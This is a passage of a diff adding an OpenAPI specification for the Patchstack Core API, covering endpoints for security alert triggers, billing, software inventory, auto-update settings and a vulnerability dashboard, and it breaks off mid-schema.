@@ -1,0 +1,4443 @@
+openapi: 3.0.0
+info:
+  title: 'Patchstack Core API'
+  description: 'This is the initial version of the Patchstack core API documentation.<br><br>It is important to pass the API token in the "UserToken" HTTP header.<br>The UserToken API key can be found here [https://app.patchstack.com/settings/integrations](https://app.patchstack.com/settings/integrations)'
+  version: 1.0.0
+servers:
+  -
+    url: 'https://api.patchstack.com/monitor'
+    description: 'Patchstack App API'
+paths:
+  /alerts/latest:
+    post:
+      tags:
+        - Alert
+      summary: 'Latest triggered rules'
+      description: 'Get the latest triggered rules.'
+      operationId: 4a8e2a7ee5c27ba53844e6012b1fba91
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { alerts: { description: Alerts, type: array, items: { properties: { id: { description: 'The alert trigger unique identifier.', type: integer, example: 1 }, siteid: { description: 'The site identifier on which the alert rule got triggered.', type: integer, example: 1 }, url: { description: 'Site URL.', type: string, example: 'https://test.com' }, date: { description: 'Date of trigger.', type: string, example: '2024-01-09T09:17:42.000000Z' }, data: { description: 'Array of information related to the alert.', type: array, items: { properties: { sw_key: { description: 'Software key identifier.', type: string, example: wp-rocket/wp-rocket.php }, sw_name: { description: 'Software name.', type: string, example: 'WP Rocket' }, sw_type: { description: 'Software type.', type: string, example: plugin }, sw_active: { description: 'Software active state.', type: integer, example: 1 }, sw_cur_ver: { description: 'Software current version.', type: string, example: 3.15.6 }, sw_new_ver: { description: 'Software new version.', type: string, example: 3.15.7 }, sw_key_title: { description: 'Software slug.', type: string, example: wp-rocket } }, type: object } }, trigger: { description: 'The trigger related to the alert.', type: array, items: { properties: { id: { description: 'The identifier of the trigger.', type: integer, example: 1 }, userid: { description: 'The id of the user that owns this trigger.', type: integer, example: 1 }, title: { description: 'Title of trigger.', type: string, example: 'Vulnerable Software Alert' }, type: { $ref: '#/components/schemas/alert_trigger_type' }, trigger: { $ref: '#/components/schemas/alert_trigger_condition' }, action: { $ref: '#/components/schemas/alert_trigger_action' }, active: { description: 'Active state of the trigger.', type: boolean, example: true }, created_at: { description: 'Created at timestamp.', type: string, example: '2023-12-15 07:46:16' }, updated_at: { description: 'Updated at timestamp.', type: string, example: '2023-12-15 07:46:16' } }, type: object } }, counters: { description: 'Counters of alerts.', type: array, items: { properties: { total: { description: 'Total alerts.', type: integer, example: 1 }, software: { description: 'Software related alerts.', type: integer, example: 1 }, activity: { description: 'Activity related alerts.', type: integer, example: 0 } }, type: object } } }, type: object } } }
+                  type: object
+              example:
+                alerts:
+                  '0': { id: 1, siteid: 1, url: 'https://test.com', date: '2024-01-09T09:17:42.000000Z', data: { sw_key: wp-rocket/wp-rocket.php, sw_name: 'WP Rocket', sw_type: plugin, sw_active: 1, sw_cur_ver: 3.15.6, sw_new_ver: 3.15.7, sw_key_title: wp-rocket }, trigger: { id: 1, userid: 1, title: 'Vulnerable Software Alert', type: software, trigger: { value: null, attribute: vulnerable, comparison: null }, action: { alert: 'email notification', target: test@test.com }, active: 1, created_at: '2023-12-15 07:46:16', updated_at: '2023-12-15 07:46:16' } }
+                  counters: { total: 1, software: 1, activity: 0 }
+  /alerts/triggers:
+    get:
+      tags:
+        - Alert
+      summary: 'Get user triggers'
+      description: 'Get all the triggers of the user.'
+      operationId: abbff733a60f0103723117c700f1b2b8
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { triggers: { description: Triggers, type: array, items: { properties: { id: { description: 'The identifier of the trigger.', type: integer, example: 1 }, userid: { description: 'The id of the user that owns this trigger.', type: integer, example: 1 }, title: { description: 'Title of trigger.', type: string, example: 'Vulnerable Software Alert' }, type: { $ref: '#/components/schemas/alert_trigger_type' }, trigger: { $ref: '#/components/schemas/alert_trigger_condition' }, action: { $ref: '#/components/schemas/alert_trigger_action' }, active: { description: 'Active state of the trigger.', type: boolean, example: true }, created_at: { description: 'Created at timestamp.', type: string, example: '2023-12-15 07:46:16' }, updated_at: { description: 'Updated at timestamp.', type: string, example: '2023-12-15 07:46:16' } }, type: object } } }
+                  type: object
+              example:
+                triggers:
+                  - { id: 1, userid: 1, title: 'Vulnerable Software Alert', type: software, trigger: { value: null, attribute: vulnerable, comparison: null }, action: { alert: 'email notification', target: test@test.com }, active: 1, created_at: '2023-12-15 07:46:16', updated_at: '2023-12-15 07:46:16' }
+  /alerts/create:
+    post:
+      tags:
+        - Alert
+      summary: 'Create trigger'
+      description: 'Create a new trigger.'
+      operationId: 686e3fff6128afcd6790bb5207006208
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              properties:
+                title:
+                  description: 'The title of the alert.'
+                  type: string
+                  example: 'Vulnerable Software Alert'
+                alert:
+                  description: 'The email address to alert.'
+                  type: string
+                  example: test@test.com
+                alerttype:
+                  $ref: '#/components/schemas/alert_trigger_alert_type'
+                patch_priority:
+                  description: 'If subtype is vulnerable, dictates if should exclude low priority vulnerabilities.'
+                  type: boolean
+                  example: false
+                type:
+                  $ref: '#/components/schemas/alert_trigger_type'
+                subtype:
+                  $ref: '#/components/schemas/alert_trigger_subtype'
+                value:
+                  $ref: '#/components/schemas/alert_trigger_value'
+                valuetype:
+                  $ref: '#/components/schemas/alert_trigger_valuetype'
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The alert trigger has been created.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'The trigger could not be created.'
+  '/alerts/delete/{trigger}':
+    delete:
+      tags:
+        - Alert
+      summary: 'Delete trigger'
+      description: 'Delete a trigger.'
+      operationId: 02b142d65540ce946957c6bd349c77a7
+      parameters:
+        -
+          name: trigger
+          in: path
+          description: 'The unique identifier of the trigger.'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The alert trigger has been deleted.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'The alert trigger could not be deleted.'
+  '/alerts/view/{trigger}':
+    get:
+      tags:
+        - Alert
+      summary: 'View trigger'
+      description: 'View a specific trigger.'
+      operationId: 30e966989339ef05cd390c8214a672ab
+      parameters:
+        -
+          name: trigger
+          in: path
+          description: 'Unique identifier of the trigger.'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { trigger: { description: Trigger, type: array, items: { properties: { id: { description: 'Unique identifier of the trigger.', type: integer, example: 1 }, userid: { description: 'Unique identifier of the user that owns this trigger.', type: integer, example: 1 }, title: { description: 'The title of the trigger.', type: string, example: 'Vulnerable Software Alert' }, type: { $ref: '#/components/schemas/alert_trigger_type' }, trigger: { $ref: '#/components/schemas/alert_trigger_condition' }, action: { $ref: '#/components/schemas/alert_trigger_action' }, active: { description: 'Active state.', type: boolean, example: true }, created_at: { description: 'Created at.', type: string, example: '2023-12-15 07:46:16' }, updated_at: { description: 'Updated at.', type: string, example: '2023-12-15 07:46:16' } }, type: object } } }
+                  type: object
+              example:
+                trigger:
+                  - { id: 1, userid: 1, title: 'Vulnerable Software Alert', type: software, trigger: { value: null, attribute: vulnerable, comparison: null }, action: { alert: 'email notification', target: test@test.com }, active: 1, created_at: '2023-12-15 07:46:16', updated_at: '2023-12-15 07:46:16' }
+  '/alerts/update/{trigger}':
+    post:
+      tags:
+        - Alert
+      summary: 'Update trigger'
+      description: 'Update a specific trigger.'
+      operationId: 61ba97fd2ad452394137faf78fc9f15a
+      parameters:
+        -
+          name: trigger
+          in: path
+          description: 'The unique identifier of the trigger.'
+          required: true
+          example: '1'
+      requestBody:
+        required: false
+        content:
+          application/json:
+            schema:
+              properties:
+                title:
+                  description: 'The title of the alert.'
+                  type: string
+                  example: 'Vulnerable Software Alert'
+                alert:
+                  description: 'The email address to alert.'
+                  type: string
+                  example: test@test.com
+                alerttype:
+                  $ref: '#/components/schemas/alert_trigger_alert_type'
+                patch_priority:
+                  description: 'If subtype is vulnerable, dictates if should exclude low priority vulnerabilities.'
+                  type: boolean
+                  example: false
+                type:
+                  $ref: '#/components/schemas/alert_trigger_type'
+                subtype:
+                  $ref: '#/components/schemas/alert_trigger_subtype'
+                value:
+                  $ref: '#/components/schemas/alert_trigger_value'
+                valuetype:
+                  $ref: '#/components/schemas/alert_trigger_valuetype'
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The trigger has been updated.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'The alert trigger could not be updated.'
+  '/billing/view/{id}':
+    get:
+      tags:
+        - Billing
+      summary: 'Download invoice PDF'
+      description: 'Download an invoice as a PDF.'
+      operationId: f98286f73838e0f0953eb0bc4c18c812
+      parameters:
+        -
+          name: id
+          in: path
+          description: 'Invoice identifier, including country prefix.'
+          example: DE-1234
+      responses:
+        '200':
+          description: 'File retrieved, served as application/pdf.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'Invalid invoice.'
+  /billing/invoices:
+    post:
+      tags:
+        - Billing
+      summary: 'List invoices'
+      description: 'Compose a list of all invoices that belong to the current authenticated user.'
+      operationId: c6314823a95668ac56a885aa84f68b12
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { invoices: { description: Invoices, type: array, items: { properties: { id: { description: 'Unique identifier of the invoice.', type: string, example: DE-1234 }, status: { description: 'Status of the invoice.', type: string, enum: [open, pending, past_due, paid, failed], example: paid }, creation: { description: 'Creation date.', type: string, example: 'April 04, 2024' }, amount_inc: { description: 'Amount, incl. taxes.', type: string, example: '7,000.00' } }, type: object } }, total: { description: 'Total number of invoices.', type: integer, example: 1 } }
+                  type: object
+              example:
+                invoices:
+                  - { id: 2579, status: paid, creation: 'April 04, 2024', amount_inc: '7,000.00' }
+                  - { id: DE-2580, status: open, creation: 'April 04, 2024', amount_inc: '3,000.00' }
+                  - { id: 2581, status: paid, creation: 'April 04, 2024', amount_inc: '2,000.00' }
+                  - { id: 2582, status: pending, creation: 'April 04, 2024', amount_inc: '1,000.00' }
+                total: 4
+  /billing/info:
+    get:
+      tags:
+        - Billing
+      summary: 'Get billing information'
+      description: 'Get the billing information of the user from Recurly.'
+      operationId: 98c3430d50714a51ebdc44df856fb2a7
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { postal_code: { description: 'Postal code', type: string, example: '12345' }, payment: { description: Payment, type: array, items: { properties: { type: { description: Type, type: string, example: credit_card }, card: { description: Card, type: string, example: 'American Express' }, last_four: { description: last_four, type: sting, example: '0005' } }, type: object } }, first_name: { description: 'First name', type: string, example: James }, last_name: { description: 'Last name', type: string, example: Bond }, company: { description: Company, type: string, example: null }, address1: { description: 'Address 1', type: string, example: 'My street 5' }, address2: { description: 'Address 2', type: string, example: null }, city: { description: City, type: string, example: Cityville }, state: { description: State, type: string, example: California }, country: { description: Country, type: string, example: USA }, cost: { description: 'Current subscription cost.', type: integer, example: 0 }, pending_cost: { description: 'Pending cost, if subscription were to change.', type: integer, example: 0 }, has_pending: { description: 'If the user has a pending subscription change.', type: boolean, example: false }, status: { description: Status, type: sting, enum: [active, canceled, expired, failed, future, paused], example: active }, renew: { description: 'Renewal date.', type: sting, example: '22 November 2024' }, addons: { description: Addons, type: array, items: { properties: { api: { description: 'Vulnerability database API cost in cents.', type: integer, example: 14900 }, volume: { description: 'Volume upgrade cost in cents.', type: integer, example: 9900 } }, type: object } }, balance: { description: 'Credit balance on the account.', type: sting, example: '13,00' }, upcoming: { description: 'Upcoming invoice cost, if any.', type: array, items: { properties: { balance: { description: 'The total cost of the invoice in cents.', type: integer, example: 0 }, discount: { description: 'Discount applied to the invoice in cents.', type: integer, example: 0 } }, type: object } } }
+                  type: object
+              example:
+                postal_code: '12345'
+                payment:
+                  type: credit_card
+                  card: 'American Express'
+                  last_four: '0005'
+                first_name: James
+                last_name: Bond
+                company: null
+                address1: 'Street 45'
+                address2: null
+                city: Cityville
+                state: California
+                country: USA
+                vat_number: null
+                cost: 0
+                pending_cost: 0
+                has_pending: false
+                status: active
+                renew: '22 November 2024'
+                addons:
+                  api: 14900
+                  volume: 9900
+                balance: '13,00'
+                upcoming:
+                  balance: 0
+                  discount: 0
+  /billing/remove:
+    delete:
+      tags:
+        - Billing
+      summary: 'Remove billing info'
+      description: 'Remove billing info from the account.'
+      operationId: 97f8512056a3fb8ee683d15eb0f3dea7
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The billing information has been removed.'
+  /billing/total:
+    post:
+      tags:
+        - Billing
+      summary: 'Get billing cost'
+      description: 'Get the total cost given the plan details.'
+      operationId: c670be34ccb89a826f7406aa2c4318fc
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - frequency
+                - plan
+              properties:
+                frequency:
+                  description: Frequency
+                  type: string
+                  default: monthly
+                  enum: [monthly, annually]
+                plan:
+                  description: Plan
+                  type: string
+                  default: pro
+                  enum: [community, pro, business]
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { total: { description: 'Total cost.', type: string, example: '7000.00' }, savings: { description: Savings, type: string, example: '7.00' } }
+                  type: object
+              example:
+                total: '7000.00'
+                savings: '7.00'
+  '/billing/payment/protection/{site}':
+    post:
+      tags:
+        - Billing
+      summary: 'Activate community protection'
+      description: 'Process the activation of the protection module for a community user.'
+      operationId: d57dcafef94b9ee61d6429de754fb719
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      requestBody:
+        required: false
+        content:
+          application/json:
+            schema:
+              properties:
+                modules:
+                  type: array
+                  items: { type: int }
+                  example: [383, 381, 178, 1]
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'Protection for this site has been enabled.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'You are not a community user or your subscription has been cancelled.'
+  '/billing/payment/protection/{site}/deactivate':
+    post:
+      tags:
+        - Billing
+      summary: 'Deactivate community protection'
+      description: 'Process the deactivation of the protection module for a community user.'
+      operationId: bbdc7aec8dad6cfae8a8f3e811b3ef23
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'Protection for this site has been deactivated.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'You are not a community user or your subscription has been cancelled.'
+  /billing/coupons:
+    get:
+      tags:
+        - Billing
+      summary: 'Get active coupons'
+      description: 'Get all active coupons of the user.'
+      operationId: 42f2eb3c0fb29d2c9b95daf895a174f0
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { coupon: { description: Coupon, type: array, items: { properties: { name: { description: Name, type: string, example: coupon-tab-6mo }, discount_type: { description: 'Discount type', type: string, enum: [fixed, percent], example: percent }, discount_percent: { description: 'Discount percent', type: integer, example: 50 }, duration_type: { description: 'Duration type', type: string, enum: [day, week, month, year], example: month }, duration_length: { description: 'Duration length, multiplies by duration_type.', type: integer, example: 6 }, plan_codes: { description: 'Plan codes to which the coupon can be applied.', type: string, example: [pro-monthly, pro-annually] }, free_trial_unit: { description: 'Free trial unit amount.', type: string, enum: [day, month, week, ''], example: '' }, free_trial_amount: { description: 'Free trial duration length, multiplies by free_trial_unit.', type: integer, example: 0 }, item_codes: { description: 'Item codes to which the discount applies, if any.', type: string, example: [protected-sites] }, applies_to_all_plans: { description: 'Whether or not the discount applies to all plans.', type: boolean, example: false } }, type: object } } }
+                  type: object
+              example:
+                coupon:
+                  name: bf2024-tab-6mo
+                  discount_type: percent
+                  discount_percent: 50
+                  discount_in_cents: null
+                  duration_type: temporal
+                  duration_length: month
+                  plan_codes: [pro-monthly]
+                  free_trial_unit: ''
+                  free_trial_amount: 0
+                  item_codes: []
+                  applies_to_all_plans: false
+  /billing/coupon:
+    post:
+      tags:
+        - Billing
+      summary: 'Get coupon info'
+      description: 'Check the state of a coupon and get its information.'
+      operationId: 47770313240d1075154d862882b77150
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              properties:
+                coupon:
+                  type: string
+                  example: bf2024-tab-6mo
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { coupon: { description: Coupon, type: array, items: { properties: { name: { description: Name, type: string, example: coupon-tab-6mo }, discount_type: { description: 'Discount type', type: string, enum: [fixed, percent], example: percent }, discount_percent: { description: 'Discount percent', type: integer, example: 50 }, duration_type: { description: 'Duration type', type: string, enum: [day, week, month, year], example: month }, duration_length: { description: 'Duration length, multiplies by duration_type.', type: integer, example: 6 }, plan_codes: { description: 'Plan codes to which the coupon can be applied.', type: string, example: [pro-monthly, pro-annually] }, free_trial_unit: { description: 'Free trial unit amount.', type: string, enum: [day, month, week, ''], example: '' }, free_trial_amount: { description: 'Free trial duration length, multiplies by free_trial_unit.', type: integer, example: 0 }, item_codes: { description: 'Item codes to which the discount applies, if any.', type: string, example: [protected-sites] }, applies_to_all_plans: { description: 'Whether or not the discount applies to all plans.', type: boolean, example: false } }, type: object } } }
+                  type: object
+              example:
+                coupon:
+                  name: bf2024-tab-6mo
+                  discount_type: percent
+                  discount_percent: 50
+                  discount_in_cents: null
+                  duration_type: temporal
+                  duration_length: month
+                  plan_codes: { success: 'Protection for this site has been deactivated.' }
+                  free_trial_unit: ''
+                  free_trial_amount: 0
+                  item_codes: []
+                  applies_to_all_plans: false
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'The coupon code does not exist or has expired.'
+  /billing/cancel:
+    delete:
+      tags:
+        - Billing
+      summary: 'Cancel subscription'
+      description: 'Cancel the subscription at Recurly.'
+      operationId: 45ee03f595aa01aa54f42bbfa2c69796
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              properties:
+                feedback:
+                  description: 'My feedback string.'
+                  type: string
+                  example: feedback
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'The subscription has been cancelled.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'An error occurred.'
+  /component/overview:
+    get:
+      tags:
+        - Software
+      summary: 'Get all software'
+      description: 'Fetch all software information of all sites of the user.'
+      operationId: 6d5e25a69361b809cb3f2a75ec477be9
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - page
+                - perPage
+                - search
+                - search_type
+              properties:
+                page:
+                  description: 'Current paginated page.'
+                  type: integer
+                  example: 1
+                perPage:
+                  description: 'Number of entries per page.'
+                  type: integer
+                  example: 2
+                search:
+                  description: 'String to search for.'
+                  type: string
+                  example: ''
+                search_type:
+                  description: 'Search type to execute, for Application, this must be the site URL.'
+                  type: string
+                  enum: ['', Application, 'Software Name', 'Software Slug']
+                  example: 'Software Name'
+                cms_id:
+                  $ref: '#/components/schemas/cms_id'
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { siteInfo: { description: 'List of sites which have data returned in the software array.', type: array, items: { properties: { '1': { description: 'Site URL, of which the key is the site identifier.', type: string, example: 'https://test.com' } }, type: object } }, software: { description: Software, type: array, items: { properties: { site: { description: 'The unique identifier of the site.', type: integer, example: 1 }, canUpdate: { description: 'Whether or not this site can update this software.', type: boolean, example: false }, issue: { description: 'Software entry for this site and if it has a vulnerability.', type: array, items: { properties: { id: { description: 'Identifier of the software entry.', type: integer, example: 1 }, sw_type: { description: 'Software type', type: string, enum: [php, database, wordpress, core, plugin, theme, extension, module, drupal, joomla], example: php }, sw_name: { description: 'Name of the software.', type: string, example: PHP }, sw_cur_ver: { description: 'Current version, as reported by the site.', type: string, example: 7.4.3 }, sw_new_ver: { description: 'New version available, as reported by the site.', type: string, example: 7.4.3 }, sw_active: { description: 'Active state of the software.', type: boolean, example: true }, isVulnerable: { description: 'Vulnerability status of this software entry.', type: boolean, example: true }, isOutdated: { description: 'Outdated status of this software entry.', type: boolean, example: false }, fixed_in: { description: 'If vulnerable, fixed version of this vulnerability.', type: string, example: null }, affected_in: { description: 'If vulnerable, affected version of this vulnerability.', type: string, example: null }, sw_key: { description: 'Full slug of the software.', type: string, example: null }, sw_key_title: { description: 'Simple slug of the software.', type: string, example: null }, is_exploited: { description: 'If vulnerable, its exploitation status.', type: boolean, example: false }, patch_priority: { description: 'The patch priority score.', type: integer, example: 2 }, credit_name: { description: 'If vulnerable, the name of the researcher who found this.', type: string, example: 'My researcher name' } }, type: object } } }, type: object } }, total: { description: 'Total number of entries returned.', type: integer, example: 2 } }
+                  type: object
+              example:
+                siteInfo:
+                  '1': 'https://test.com'
+                software:
+                  - { site: 1, canUpdate: false, issue: { id: 41369324, sw_type: php, sw_name: PHP, sw_cur_ver: 7.4.3, sw_new_ver: '', sw_active: null, isVulnerable: false, isOutdated: null, fixed_in: null, affected_in: null, sw_key: null, sw_key_title: null, is_exploited: null, patch_priority: null, credit_name: null } }
+                  - { site: 1, canUpdate: false, issue: { id: 41369266, sw_type: plugin, sw_name: 'Anderson Pro', sw_cur_ver: 1.2.1, sw_new_ver: 1.2.2, sw_active: 1, isVulnerable: 1, isOutdated: 1, fixed_in: 1.2.2, affected_in: '< 1.2.1', sw_key: anderson/anderson.php, sw_key_title: anderson, is_exploited: 0, patch_priority: 3, credit_name: 'Researcher name' } }
+                total: 2
+  /component/autoupdates:
+    get:
+      tags:
+        - Software
+      summary: 'Get auto-update settings'
+      description: 'Get auto-update software status of each site, WordPress only.'
+      operationId: 1334e63d09b2584dcd0198b82093560a
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { total: { description: 'Total number of sites.', type: integer, example: 1 }, sites: { description: 'Sites array with their settings.', type: array, items: { properties: { site: { description: 'Unique site identifier.', type: integer, example: 1 }, addon_protection: { description: 'Addon protection status, applies to community plan only.', type: integer, example: 0 }, canUpdate: { description: 'Can update software.', type: boolean, example: true }, webarx: { description: 'The version of the WebARX (legacy) or Patchstack plugin.', type: string, example: 2.2.20 } }, type: object } } }
+                  type: object
+              example:
+                total: 1
+                sites:
+                  - { site: 1, addon_protection: 0, canUpdate: true, webarx: 2.2.20 }
+  '/component/site/{site}':
+    get:
+      tags:
+        - Software
+      summary: 'Get site auto-update state'
+      description: 'Get the current auto-update state of a site, WordPress only.'
+      operationId: 1f1e989abefe1521b2ccf4f2cc24b6e3
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                - vulnerable
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'Failed to retrieve the settings of the site. (NOT_AN_ARRAY)'
+    post:
+      tags:
+        - Software
+      summary: 'Save site auto-update state'
+      description: 'Save the auto-update state of a site, applies to WordPress only.'
+      operationId: b1e93756208821560165f36c0d39febc
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site'
+          required: true
+          example: '1'
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - vulnerable
+                - core
+                - plugin
+                - theme
+              properties:
+                vulnerable:
+                  description: 'Auto-update vulnerable only.'
+                  type: boolean
+                  example: true
+                core:
+                  description: 'Auto-update WP core only.'
+                  type: boolean
+                  example: false
+                plugin:
+                  description: 'Auto-update plugins only.'
+                  type: boolean
+                  example: false
+                theme:
+                  description: 'Auto-update themes only.'
+                  type: boolean
+                  example: false
+                type:
+                  description: 'This should be webarx for Patchstack/WebARX plugin < 2.1.0.'
+                  type: string
+                  default: patchstack
+                  enum: [patchstack, webarx]
+                  example: patchstack
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                success: 'Plugin options has been updated.'
+        '422':
+          description: ''
+          content:
+            application/json:
+              schema: {  }
+              example:
+                error: 'We could not get a valid response from the website, contact support for further assistance.'
+  /dashboard:
+    get:
+      tags:
+        - Dashboard
+      summary: 'Get dashboard statistics'
+      description: 'Fetch information that is displayed on the dashboard of the portal.'
+      operationId: f0215ca27b61aa77b8532b6da02c50a5
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { attacks: { description: 'Attacks blocked per day based on the date parameter.', properties: { num: { description: 'Number of attacks blocked.', type: integer, example: 0 }, dateday: { description: 'Date of the attacks blocked.', type: string, example: '2024-10-19' } }, type: object }, stats: { description: 'Global statistics.', properties: { components_count_sum: { description: 'Number of total software components.', type: integer, example: 1 }, components_vulnerable_sum: { description: 'Number of total vulnerable software components.', type: integer, example: 1 }, components_outdated_sum: { description: 'Number of total outdated software components.', type: integer, example: 1 }, components_disabled_sum: { description: 'Number of total disabled software components.', type: integer, example: 1 }, vulnerable_high_sum: { description: 'Number of total high risk vulnerabilities.', type: integer, example: 1 }, vulnerable_medium_sum: { description: 'Number of total medium risk vulnerabilities.', type: integer, example: 1 }, vulnerable_low_sum: { description: 'Number of total low risk vulnerabilities.', type: integer, example: 1 }, reports_downloaded: { description: 'Number of total reports downloaded.', type: integer, example: 1 }, reports_new: { description: 'Number of total new reports.', type: integer, example: 1 }, reports_schedules: { description: 'Number of total report schedules.', type: integer, example: 1 }, sites_connected: { description: 'Number of total sites with an active connection.', type: integer, example: 1 }, sites_outdated: { description: 'Number of total sites with outdated software.', type: integer, example: 1 }, sites_total: { description: 'Number of total sites.', type: integer, example: 1 }, sites_vulnerable: { description: 'Number of total sites with vulnerabilities.', type: integer, example: 1 } }, type: object } }
+                  type: object
+              example:
+                attacks:
+                  - { num: 0, dateday: '2024-10-14' }
+                  - { num: 0, dateday: '2024-10-15' }
+                  - { num: 0, dateday: '2024-10-16' }
+                  - { num: 0, dateday: '2024-10-17' }
+                  - { num: 0, dateday: '2024-10-18' }
+                  - { num: 0, dateday: '2024-10-19' }
+                  - { num: 0, dateday: '2024-10-20' }
+                  - { num: 0, dateday: '2024-10-21' }
+                  - { num: 0, dateday: '2024-10-22' }
+                stats:
+                  components_count_sum: 60
+                  components_vulnerable_sum: 23
+                  components_outdated_sum: 38
+                  components_disabled_sum: 16
+                  vulnerable_high_sum: 6
+                  vulnerable_medium_sum: 16
+                  vulnerable_low_sum: 36
+                  sites_total: 1
+                  sites_outdated: 1
+                  sites_vulnerable: 1
+                  sites_connected: 0
+                  reports_schedules: 1
+                  reports_new: 1
+                  reports_downloaded: 0
+  '/dashboard/vulnerabilities/{site?}':
+    post:
+      tags:
+        - Dashboard
+      summary: 'Get vulnerabilities'
+      description: 'Fetch vulnerability information that is displayed on the dashboard of the portal.'
+      operationId: 8a6e3f514edd9f267812dc853398e716
+      parameters:
+        -
+          name: site
+          in: path
+          description: 'The unique identifier of the site to find vulnerabilities for, optional parameter.'
+          example: 1
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              required:
+                - cms_id
+                - isExploited
+                - isFixed
+                - isMitigated
+                - order
+                - page
+                - perPage
+                - search
+                - selectedPriority
+                - selectedSeverity
+              properties:
+                cms_id:
+                  $ref: '#/components/schemas/cms_id'
+                isExploited:
+                  description: 'Filter by exploitation status.'
+                  type: boolean
+                  example: false
+                isFixed:
+                  description: 'Filer by vulnerability fixed status'
+                  type: boolean
+                  example: false
+                isMitigated:
+                  type: boolean
+                  example: false
+                  deprecated: true
+                order:
+                  description: '0 = newest + priority, 1 = oldest + priority, 2 = newest, 3 = oldest'
+                  type: integer
+                  enum: [0, 1, 2, 3]
+                  example: 0
+                page:
+                  description: 'Current pagination page.'
+                  type: integer
+                  example: 25
+                perPage:
+                  description: 'Number of results per page.'
+                  type: integer
+                  example: 25
+                search:
+                  description: 'Search by vulnerability title or site URL.'
+                  type: string
+                  example: ''
+                selectedPriority:
+                  description: 'Filter by patch priority.'
+                  type: array
+                  items: { type: string }
+                  enum: [High, Medium, Low]
+                  example: [High]
+                selectedSeverity:
+                  description: 'Filter by severity (CVSS score).'
+                  type: array
+                  items: { type: string }
+                  enum: [Critical, High, Medium, Low]
+                  example: [Critical]
+              type: object
+      responses:
+        '200':
+          description: ''
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  properties: { site: { description: 'Unique identifier of the site.', type: integer, example: 1 }, site_id: { description: 'Unique identifier of the site.', type: integer, example: 1 }, url: { description: 'The URL of the site.', type: string, example: 'https://test.com' }, cms: { description: 'CMS of the site.', type: string, example: WordPress }, addon_protection: { description: 'If class = 0, dictates if paid protection is enabled.', type: boolean, example: false }, slug: { description: 'Vulnerability URL slug.', type: string, example: wordpress-oxygen-plugin-4-8-1-auth-remote-code-execution-rce-vulnerability }, issue: { description: 'Vulnerable software name.', type: string, example: 'Oxygen Builder' }, name: { description: 'Vulnerable software name.', type: string, example: 'Oxygen Builder' }, vuln_type: { description: 'Vulnerability type.', type: string, example: 'Remote Code Execution (RCE)' }, affected_in: { description: 'If vulnerable, affected version of this vulnerability.', type: string, example: null }, fixed_in: { description: 'If vulnerable, fixed version of this vulnerability.', type: string, example: null }, is_exploited: { description: 'If vulnerable, its exploitation status.', type: boolean, example: false }, patch_priority: { description: 'The patch priority score.', type: integer, example: 2 }, credit_name: { description: 'If vulnerable, the name of the researcher who found 